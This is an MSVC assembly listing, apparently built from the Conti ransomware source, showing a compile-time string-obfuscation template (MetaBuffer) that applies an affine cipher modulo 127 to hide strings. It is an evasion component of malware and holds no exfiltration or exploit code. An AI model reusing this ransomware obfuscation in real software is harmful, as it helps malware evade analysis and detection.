	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 46	 sub	 eax, 70			; 00000046H
  0002d	6b c0 dd	 imul	 eax, eax, -35		; ffffffffffffffddH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 1d	 imul	 eax, eax, 29
  0002d	83 c0 46	 add	 eax, 70			; 00000046H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 4b	 sub	 eax, 75			; 0000004bH
  0002d	6b c0 e6	 imul	 eax, eax, -26
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
